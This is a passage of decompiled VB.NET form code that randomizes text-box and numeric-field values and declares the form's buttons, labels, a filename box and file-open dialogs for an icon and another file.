			Me.T1.Text = Me.GENRandom(12, 55)
			Me.T2.Text = Me.GENRandom(5, 44)
			Me.T3.Text = Me.GENRandom(12, 50)
			Me.T4.Text = Me.GENRandom(12, 88)
			Me.T5.Text = Me.GENRandom(12, 93)
			Me.N1.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N2.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N3.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N4.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N6.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N7.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N8.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N9.Value = Conversions.ToDecimal(Me.RandomN())
		End Sub

		' Token: 0x04000031 RID: 49
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x04000033 RID: 51
		<AccessedThroughProperty("FormSkin1")>
		Private _FormSkin1 As FormSkin

		' Token: 0x04000034 RID: 52
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

		' Token: 0x04000035 RID: 53
		<AccessedThroughProperty("Button6")>
		Private _Button6 As Button

		' Token: 0x04000036 RID: 54
		<AccessedThroughProperty("Button4")>
		Private _Button4 As Button

		' Token: 0x04000037 RID: 55
		<AccessedThroughProperty("Button3")>
		Private _Button3 As Button

		' Token: 0x04000038 RID: 56
		<AccessedThroughProperty("Button2")>
		Private _Button2 As Button

		' Token: 0x04000039 RID: 57
		<AccessedThroughProperty("Label8")>
		Private _Label8 As Label

		' Token: 0x0400003A RID: 58
		<AccessedThroughProperty("Label7")>
		Private _Label7 As Label

		' Token: 0x0400003B RID: 59
		<AccessedThroughProperty("N9")>
		Private _N9 As NumericUpDown

		' Token: 0x0400003C RID: 60
		<AccessedThroughProperty("N8")>
		Private _N8 As NumericUpDown

		' Token: 0x0400003D RID: 61
		<AccessedThroughProperty("N7")>
		Private _N7 As NumericUpDown

		' Token: 0x0400003E RID: 62
		<AccessedThroughProperty("N6")>
		Private _N6 As NumericUpDown

		' Token: 0x0400003F RID: 63
		<AccessedThroughProperty("N4")>
		Private _N4 As NumericUpDown

		' Token: 0x04000040 RID: 64
		<AccessedThroughProperty("N3")>
		Private _N3 As NumericUpDown

		' Token: 0x04000041 RID: 65
		<AccessedThroughProperty("N2")>
		Private _N2 As NumericUpDown

		' Token: 0x04000042 RID: 66
		<AccessedThroughProperty("N1")>
		Private _N1 As NumericUpDown

		' Token: 0x04000043 RID: 67
		<AccessedThroughProperty("Label6")>
		Private _Label6 As Label

		' Token: 0x04000044 RID: 68
		<AccessedThroughProperty("Label4")>
		Private _Label4 As Label

		' Token: 0x04000045 RID: 69
		<AccessedThroughProperty("Label3")>
		Private _Label3 As Label

		' Token: 0x04000046 RID: 70
		<AccessedThroughProperty("Label2")>
		Private _Label2 As Label

		' Token: 0x04000047 RID: 71
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x04000048 RID: 72
		<AccessedThroughProperty("T5")>
		Private _T5 As TextBox

		' Token: 0x04000049 RID: 73
		<AccessedThroughProperty("T4")>
		Private _T4 As TextBox

		' Token: 0x0400004A RID: 74
		<AccessedThroughProperty("T3")>
		Private _T3 As TextBox

		' Token: 0x0400004B RID: 75
		<AccessedThroughProperty("T2")>
		Private _T2 As TextBox

		' Token: 0x0400004C RID: 76
		<AccessedThroughProperty("T1")>
		Private _T1 As TextBox

		' Token: 0x0400004D RID: 77
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x0400004E RID: 78
		<AccessedThroughProperty("TXTFilename")>
		Private _TXTFilename As TextBox

		' Token: 0x0400004F RID: 79
		<AccessedThroughProperty("UserImage1")>
		Private _UserImage1 As UserImage

		' Token: 0x04000050 RID: 80
		<AccessedThroughProperty("FlatButton2")>
		Private _FlatButton2 As FlatButton

		' Token: 0x04000051 RID: 81
		<AccessedThroughProperty("PictureBox2")>
		Private _PictureBox2 As PictureBox

		' Token: 0x04000052 RID: 82
		<AccessedThroughProperty("FlatMini1")>
		Private _FlatMini1 As FlatMini

		' Token: 0x04000053 RID: 83
		Private ico As OpenFileDialog

		' Token: 0x04000054 RID: 84
		Private p As OpenFileDialog
	End Class
End Namespace
